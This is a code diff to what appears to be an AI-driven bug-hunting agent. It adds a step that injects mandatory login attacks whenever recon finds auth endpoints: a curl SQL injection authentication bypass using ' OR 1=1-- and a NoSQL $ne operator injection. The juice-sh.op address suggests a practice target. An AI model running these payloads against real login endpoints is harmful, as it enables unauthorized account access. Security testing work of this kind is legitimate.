@@ -499,6 +499,39 @@ async function agentIteration(huntId, target, recon, findings, iteration, playbo
     return { aiOk: false, best: null, failKind: 'bad_output' };
   }
 
+  // MANDATORY AUTH TESTS: If recon found login/auth endpoints and the model's
+  // plans don't include them, prepend deterministic injection tests. The model
+  // often overlooks auth; an elite hunter NEVER skips the login form.
+  // This is not a suggestion — it's a mandatory first step.
+  try {
+    const authEndpoints = (recon.endpoints || []).filter((ep) =>
+      /login|auth|signin|session|token/i.test(ep)
+    );
+    const plansMentionAuth = plans.some((p) =>
+      /login|auth|signin/i.test(`${p.test || ''} ${p.command || ''}`)
+    );
+    if (authEndpoints.length && !plansMentionAuth) {
+      const loginEp = authEndpoints[0];
+      const baseUrl = target.replace(/\/$/, '');
+      const authTests = [
+        {
+          test: 'SQLi authentication bypass on login',
+          command: `curl -sk -X POST "${baseUrl}${loginEp}" -H "Content-Type: application/json" -d '{"email":"admin@juice-sh.op'"'"' OR 1=1--","password":"x"}' | head -c 2000`,
+          why: 'Classic SQL injection in login — tests if authentication can be bypassed',
+          hypothesis: 'Login endpoint may be vulnerable to SQL injection',
+        },
+        {
+          test: 'NoSQL injection on login',
+          command: `curl -sk -X POST "${baseUrl}${loginEp}" -H "Content-Type: application/json" -d '{"email":{"$ne":null},"password":{"$ne":null}}' | head -c 2000`,
+          why: 'NoSQL injection bypass — tests for MongoDB-style auth flaws',
+          hypothesis: 'Login may use NoSQL backend vulnerable to operator injection',
+        },
+      ];
+      plans.unshift(...authTests);
+      think(huntId, `Mandatory auth tests injected for ${loginEp} (model overlooked auth)`);
+    }
+  } catch { /* mandatory tests are best-effort */ }
+
   // Execute up to 3 hypotheses (multi-hypothesis > single guess)
   let best = null;
   // PARALLEL EXECUTION: run all tests concurrently like a human would.
